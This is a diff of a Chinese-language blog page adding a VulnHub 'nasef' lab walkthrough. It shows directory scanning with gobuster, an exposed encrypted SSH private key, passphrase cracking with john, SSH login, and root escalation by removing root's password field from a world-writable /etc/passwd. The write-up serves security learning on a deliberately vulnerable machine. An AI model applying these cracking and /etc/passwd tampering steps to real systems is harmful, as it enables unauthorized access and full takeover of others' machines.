@@ -415,14 +415,14 @@ Starting Nmap 7.93 ( https:">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        250
+                        1.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        6 分
                     </div>
                     
                 
@@ -473,8 +473,178 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 23.65 seconds
 
 </code></pre>
-<p>开放了80端口，说明有web站点，访问<strong>192.168.113.133</strong>后发现是个ubuntu页面</p>
+<p>开放了22端口，说明可以ssh连接。还有开放了80端口，说明有web站点，访问<strong>192.168.113.133</strong>后发现是个ubuntu页面</p>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnhub/nasef/1.png" alt="web页面"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>接下来很常规，用gobuster扫描一下目录</p>
+<pre><code>
+└─# gobuster dir -u http://192.168.113.133 \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak,zip,zip.bak \
+  --exclude-length 0
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.113.133
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          0
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              json,zip,zip.bak,txt,js,txt.bak,html.bak,git.bak,php,html,php.bak,git
+[+] Timeout:                 10s
+===============================================================
+2023/06/13 01:50:20 Starting gobuster in directory enumeration mode
+===============================================================
+/.html.bak            (Status: 403) [Size: 280]
+/index.html           (Status: 200) [Size: 10918]
+/.html                (Status: 403) [Size: 280]
+/.html                (Status: 403) [Size: 280]
+/.html.bak            (Status: 403) [Size: 280]
+/server-status        (Status: 403) [Size: 280]
+/goodmath.txt         (Status: 200) [Size: 2571]
+Progress: 2865478 / 2867293 (99.94%)
+===============================================================                                            
+2023/06/13 02:03:23 Finished                                                                               
+=============================================================== 
+
+</code></pre><p>发现有两个可以访问文件，一个是<strong>index.html</strong>，其实也就是主页，还有一个是<strong>goodmath.txt</strong>，访问后发现是一个密钥</p>
+<pre class=" language-text"><code class="language-text">-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6A4D21879E90C5E2F448418E600FE270
+
+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
+-----END RSA PRIVATE KEY-----
+
+Here is your key agentr
+</code></pre>
+<p>发现这个私钥是agentr用户的，尝试带着密钥去登录，发现还是需要输入密码</p>
+<h3 id="ssh登录agentr用户成功"><a href="#ssh登录agentr用户成功" class="headerlink" title="ssh登录agentr用户成功"></a>ssh登录agentr用户成功</h3><blockquote>
+<p>ssh <a href="mailto:agentr@192.168.113.133">agentr@192.168.113.133</a> -i id_rsa </p>
+</blockquote>
+<pre><code>
+The authenticity of host &#39;192.168.113.133 (192.168.113.133)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:MiWFyMpv6RiylpvRpjvL4u9OkmqJuC6OfbLMbQJSB7k.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.113.133&#39; (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for &#39;id_rsa&#39; are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key &quot;id_rsa&quot;: bad permissions
+agentr@192.168.113.133&#39;s password: 
+
+
+</code></pre><p>想到用john破解密码，先将私钥转化为哈希，然后再用john破解</p>
+<blockquote>
+<p>  ssh2john id_rsa &gt; hash<br>    john hash</p>
+</blockquote>
+<pre><code>
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+reading          (id_rsa)     
+1g 0:00:00:09 DONE 3/3 (2023-06-13 02:49) 0.1036g/s 1378Kp/s 1378Kc/s 1378KC/s readie3..readido
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+
+</code></pre><p>得到密码是reading</p>
+<p>ssh登录后成功</p>
+<blockquote>
+<p>ssh <a href="mailto:agentr@192.168.113.133">agentr@192.168.113.133</a> -i id_rsa</p>
+</blockquote>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先上传<strong>linpeas.sh</strong>脚本扫描一下看看，扫描结果如下（一般关注黄色字眼）：</p>
+<pre><code>
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                                       
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files            
+/dev/mqueue                                                                                  
+/dev/shm
+/etc/passwd
+/home/agentr
+/run/lock
+/run/screen
+/run/user/1001
+/run/user/1001/dbus-1
+/run/user/1001/dbus-1/services
+/run/user/1001/gnupg
+/run/user/1001/inaccessible
+/run/user/1001/systemd
+/run/user/1001/systemd/transient
+/run/user/1001/systemd/units
+/snap/core18/1880/run/lock
+/snap/core18/1880/tmp
+/snap/core18/1880/var/tmp
+/snap/core18/2785/tmp
+/snap/core18/2785/var/tmp
+/snap/core20/1891/run/lock
+/snap/core20/1891/tmp
+/snap/core20/1891/var/tmp
+/tmp
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/crash
+/var/tmp
+
+
+</code></pre><p>发现这里有个 <strong>/etc/passwd</strong>，是可写了，关于这个文件的详解可以看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/davis12/p/14373311.html">此处</a></p>
+<p>既然可以写，那就很简单提权了。修改passwd文件，将root用户后的x直接删除，表示不需要密码可以登录</p>
+<blockquote>
+<p>vim /etc/passwd<br>    su</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/nasef/2.png" alt="提权成功"></p>
 
             </div>
             <hr/>
@@ -924,7 +1094,7 @@ Starting Nm</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">72.9k</span>
+                <span class="white-color">73.9k</span>
             
 
             
